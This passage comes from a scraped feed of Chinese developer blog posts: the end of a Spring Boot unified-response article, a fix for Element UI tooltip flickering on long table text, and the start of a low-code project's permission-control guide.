        <span class="hljs-comment">// 请求结束后清理 MDC，避免内存泄漏</span>
        MDC.remove(TRACE_ID);
    }
}
</code></pre>
<p><strong>配置拦截器：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> TraceInterceptor traceInterceptor;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> {
        registry.addInterceptor(traceInterceptor);
    }
}
</code></pre>
<h3 data-id="heading-11">七、使用示例：封装前后的对比</h3>
<h4 data-id="heading-12">封装前：每个接口都要写重复代码</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/user/{id}")</span>
<span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
    Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findById(id);
        result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">true</span>);
        result.put(<span class="hljs-string">"data"</span>, user);
        result.put(<span class="hljs-string">"message"</span>, <span class="hljs-string">"查询成功"</span>);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        result.put(<span class="hljs-string">"success"</span>, <span class="hljs-literal">false</span>);
        result.put(<span class="hljs-string">"message"</span>, e.getMessage());
    }
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<h4 data-id="heading-13">封装后：一行代码搞定</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/user/{id}")</span>
<span class="hljs-keyword">public</span> ApiResponse&lt;User&gt; <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findById(id);
    <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(ResponseCodeEnum.NOT_FOUND);
    }
    <span class="hljs-keyword">return</span> ApiResponse.success(user);
}
</code></pre>
<p><strong>优势：</strong> 代码简洁、格式统一、易于维护，前端处理逻辑也统一了。</p>
<h3 data-id="heading-14">八、简单单元测试示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.junit.Test;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.Assert.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiResponseTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSuccess</span><span class="hljs-params">()</span> {
        ApiResponse&lt;String&gt; response = ApiResponse.success(<span class="hljs-string">"test"</span>);
        assertEquals(<span class="hljs-number">200</span>, response.getCode().intValue());
        assertEquals(<span class="hljs-string">"操作成功"</span>, response.getMessage());
        assertEquals(<span class="hljs-string">"test"</span>, response.getData());
        assertNotNull(response.getTimestamp());
        assertNotNull(response.getFormattedTime());
    }
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testError</span><span class="hljs-params">()</span> {
        ApiResponse&lt;Object&gt; response = ApiResponse.error(ResponseCodeEnum.NOT_FOUND);
        assertEquals(<span class="hljs-number">404</span>, response.getCode().intValue());
        assertEquals(<span class="hljs-string">"资源不存在"</span>, response.getMessage());
        assertNull(response.getData());
    }
}
</code></pre>
<h3 data-id="heading-15">九、总结：封装的核心价值与优化收益</h3>
<p><strong>核心价值：</strong></p>
<ol>
<li><strong>统一格式</strong>：前后端对接更顺畅，就像统一了"语言规则"</li>
<li><strong>提高效率</strong>：减少重复代码，开发速度提升 50%+</li>
<li><strong>易于维护</strong>：修改返回格式时，只需改一个类</li>
<li><strong>降低错误率</strong>：格式统一，减少因格式不一致导致的 Bug</li>
</ol>
<p><strong>优化收益：</strong></p>
<ul>
<li><strong>枚举化</strong>：告别魔法值，代码可读性提升 80%</li>
<li><strong>Lombok</strong>：减少样板代码 60%+</li>
<li><strong>链路追踪</strong>：问题排查时间减少 50%+</li>
<li><strong>享元模式</strong>：高频响应对象创建开销减少 30%</li>
<li><strong>Jackson 配置</strong>：响应数据体积减少 10-20%（null 字段不返回）</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Element UI 表格 show-overflow-tooltip 长文本导致闪烁的根本原因与解法]]></title>    <link>https://juejin.cn/post/7592996072705540146</link>    <guid>https://juejin.cn/post/7592996072705540146</guid>    <pubDate>2026-01-09T05:55:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705540146" data-draft-id="7592992745573711910" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Element UI 表格 show-overflow-tooltip 长文本导致闪烁的根本原因与解法"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-09T05:55:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="user8615818578154"/> <meta itemprop="url" content="https://juejin.cn/user/3549647826599133"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Element UI 表格 show-overflow-tooltip 长文本导致闪烁的根本原因与解法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3549647826599133/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    user8615818578154
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:55:39.000Z" title="Fri Jan 09 2026 05:55:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">问题复现</h3>
<p>在 Element UI (Vue 2) 项目中，<code>el-table-column</code> 开启 <code>show-overflow-tooltip</code> 展示超长文本（500字+）。
<strong>现象：</strong> 鼠标悬停单元格，Tooltip 疯狂闪烁（显示-消失-显示循环），侧边滚动条也跟随闪烁（副作用）。
<strong>关键环境信息：</strong> 页面原本就有滚动条（无布局重排），但依然闪烁。</p>
<h3 data-id="heading-1">排查与验证</h3>
<p><strong>初步排查：</strong> 曾怀疑是 Tooltip 撑开页面导致滚动条出现进而挤压布局。但经过验证，页面滚动条一直存在，布局并未发生位移，因此排除“重排（Reflow）”导致的坐标变化。</p>
<p><strong>核心对照实验：</strong></p>
<ol>
<li><strong>自动模式</strong>：使用 <code>show-overflow-tooltip</code> -&gt; <strong>闪烁</strong>。</li>
<li><strong>手动模式</strong>：在 <code>template</code> 中使用 <code>&lt;el-tooltip&gt;</code> 包裹内容，<strong>不限制宽高</strong> -&gt; <strong>不闪烁</strong>。</li>
</ol>
<h3 data-id="heading-2">根本原因分析</h3>
<p>既然布局没动，为什么会自动关闭？答案是 <strong>Tooltip 自身的遮挡与事件逻辑缺陷</strong>。</p>
<h4 data-id="heading-3">1. 遮挡触发 (Occlusion)</h4>
<p>由于文本极长，Tooltip 渲染尺寸巨大。在特定分辨率下，Popper.js 计算出的定位会导致 <strong>Tooltip 弹出的一瞬间，其 DOM 元素直接覆盖（Overlap）在了鼠标光标之上</strong>。</p>
<h4 data-id="heading-4">2. 机制差异</h4>
<ul>
<li><strong><code>show-overflow-tooltip</code> (Table 内置逻辑)</strong> ：Element UI 的 Table 组件使用<strong>单例模式</strong>维护一个全局 Tooltip。它主要监听单元格（Cell）的 <code>mouseleave</code> 事件。<strong>Bug 流程：</strong> Tooltip 弹出盖住鼠标 -&gt; 浏览器判定鼠标离开单元格（进入 Tooltip） -&gt; 触发 Cell 的 <code>mouseleave</code> -&gt; Table 的处理逻辑较为脆弱，在判定“鼠标是否进入 Tooltip”时出现时序问题或逻辑漏洞 -&gt; <strong>直接关闭 Tooltip</strong>。 Tooltip 关闭 -&gt; 鼠标重新落回单元格 -&gt; 触发 <code>mouseenter</code> -&gt; <strong>死循环</strong>。</li>
<li><strong>手动 <code>&lt;el-tooltip&gt;</code> (独立组件)</strong> ：手动模式下，每个单元格拥有独立的 Tooltip 实例。该组件内部对 <code>enterable</code>（鼠标进入浮层）有完善的处理机制。 <strong>正常流程：</strong> Tooltip 弹出盖住鼠标 -&gt; 组件检测到鼠标虽然离开了 Reference（触发源），但进入了 Popper（浮层） -&gt; <strong>保持显示状态</strong>。</li>
</ul>
<h3 data-id="heading-5">结论与解决方案</h3>
<p><code>show-overflow-tooltip</code> 是一个为了性能牺牲了部分交互稳定性的“阉割版”实现，无法完美处理“弹出层直接遮挡触发源”的极端情况。</p>
<p><strong>最佳解法：</strong> 放弃 <code>show-overflow-tooltip</code>，使用 Slot 手动接管。</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> <span class="hljs-attr">label</span>=<span class="hljs-string">"详情"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"300"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">"scope"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-tooltip</span> 
      <span class="hljs-attr">effect</span>=<span class="hljs-string">"dark"</span> 
      <span class="hljs-attr">:content</span>=<span class="hljs-string">"scope.row.detail"</span> 
      <span class="hljs-attr">placement</span>=<span class="hljs-string">"top"</span>
      <span class="hljs-attr">popper-class</span>=<span class="hljs-string">"my-popper"</span>
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ellipsis-cell"</span>&gt;</span>{{ scope.row.detail }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-tooltip</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span>
</code></pre>
<p><strong>建议优化：</strong> 虽然手动挡不限制宽高也不会闪烁，但为了阅读体验，建议通过 CSS 限制最大高度。</p>
<pre><code class="hljs language-CSS" lang="CSS"><span class="hljs-comment">/* 全局样式 */</span>
<span class="hljs-selector-class">.my-popper</span> {
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">400px</span>;
  <span class="hljs-attribute">max-height</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">overflow-y</span>: auto;
}
</code></pre>
<h3 data-id="heading-6">总结</h3>
<p>当排查“幽灵闪烁”问题时，如果页面布局未动，请重点关注<strong>层级遮挡</strong>导致的鼠标事件丢失。对于复杂场景，手动控制的组件永远比自动的语法糖更可靠。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[lecen：一个更好的开源可视化系统搭建项目--组件和功能按钮的权限控制--全低代码|所见即所得|利用可视化设计器构建你的应用系统-做一]]></title>    <link>https://juejin.cn/post/7592992745573744678</link>    <guid>https://juejin.cn/post/7592992745573744678</guid>    <pubDate>2026-01-09T06:05:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592992745573744678" data-draft-id="7593015632078733339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="lecen：一个更好的开源可视化系统搭建项目--组件和功能按钮的权限控制--全低代码|所见即所得|利用可视化设计器构建你的应用系统-做一"/> <meta itemprop="keywords" content="低代码,前端,后端"/> <meta itemprop="datePublished" content="2026-01-09T06:05:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="晴虹"/> <meta itemprop="url" content="https://juejin.cn/user/976022057782280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            lecen：一个更好的开源可视化系统搭建项目--组件和功能按钮的权限控制--全低代码|所见即所得|利用可视化设计器构建你的应用系统-做一
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022057782280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    晴虹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:05:31.000Z" title="Fri Jan 09 2026 06:05:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">控制</h2>
<p>我们通过多种方式来控制用户的权限，可以精准的针对不同的用户来达到想要的效果。</p>
<p>首先从权限维度来说，主要分为两方面：1. 用户拥有的角色，2. 动态配置的code</p>
<p>再从控制的手段来说，也主要分为两方面：1. 操作视图，2. 操作dom元素</p>
<p>由于有交叉部分，并且还有很多细化的地方，因此我们按照实现方式来对此进行说明。</p>
<p>对于权限的控制，我们可以通过在组件的json对象上添加 <code>control</code> 属性对象来实现。</p>
<p>每个组件都可以配置 <code>control</code> 属性，其中的 if 属性是个方法，通过返回值的 true 和 false 来控制组件的显示及隐藏。</p>
<p>比如在按钮组件上添加权限控制：</p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>,
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>:<span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }],
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">code</span>: <span class="hljs-string">'add'</span>,
        <span class="hljs-attr">permission</span>: [<span class="hljs-string">'roleA'</span>, <span class="hljs-string">'roleC'</span>],
        <span class="hljs-attr">noPermission</span>: [<span class="hljs-string">'roleM'</span>],
        <span class="hljs-attr">if</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
          <span class="hljs-comment">//控制组件是否渲染</span>
          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        },
        <span class="hljs-attr">call</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
          <span class="hljs-comment">//组件渲染完毕，可以执行操作</span>
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'组件渲染完毕，可以执行操作'</span>)
        },
        <span class="hljs-attr">dom</span>: <span class="hljs-string">'button_add'</span>,
        <span class="hljs-attr">view</span>: <span class="hljs-string">'button_add'</span>
      },
    }]
  }]
}]
</code></pre>
<h3 data-id="heading-1">code</h3>
<p>我们在访问不同的页面的时候，可能会根据配置的不同，以及接口返回的数据不同，把得到的一个或多个 <code>code</code> 值存储起来，每个页面都可能是不一样的 <code>code</code> 组，当解析该组件的时候，会根据当前设定的 <code>code</code> 去对应的 <code>code</code> 组里面去查找，如果找到则进行渲染，如果找不到，则直接跳过该组件。</p>
<p>存储 <code>code</code> 的集合在 <code>requestData</code> 对象的 <code>code</code> 属性对象上。</p>
<p>例：</p>
<p>页面上有两个按钮：新增和删除</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7722aaa7cd1e405997b1cc8350816ee8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=MfTzGMK1umuRa0J%2FP%2Fd6U6gSsyI%3D" alt="新增和删除按钮" loading="lazy"/></p>
<p>现在 <code>requestData</code> 对象下面的 <code>code</code> 对象是一个空对象</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/769c943b257e4394b4d0c4c7a57c5f5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=%2FCsxbWhFiy%2BtZgeLf1GuH4NK9g0%3D" alt="code空对象" loading="lazy"/></p>
<p>正常情况下，页面中的该 <code>code</code> 值应该是从接口返回的，或者根据其他配置进行设置的，现在为了方便，我们直接修改它的值</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cbd2915958143dc96b77a0452619d50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=1sOeItVofHLGgM7PbjYDU5kSeS4%3D" alt="code设置新增和删除" loading="lazy"/></p>
<p>然后我们给新增和删除按钮分别配置上不同的 <code>code</code></p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">code</span>: <span class="hljs-string">'add'</span>
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
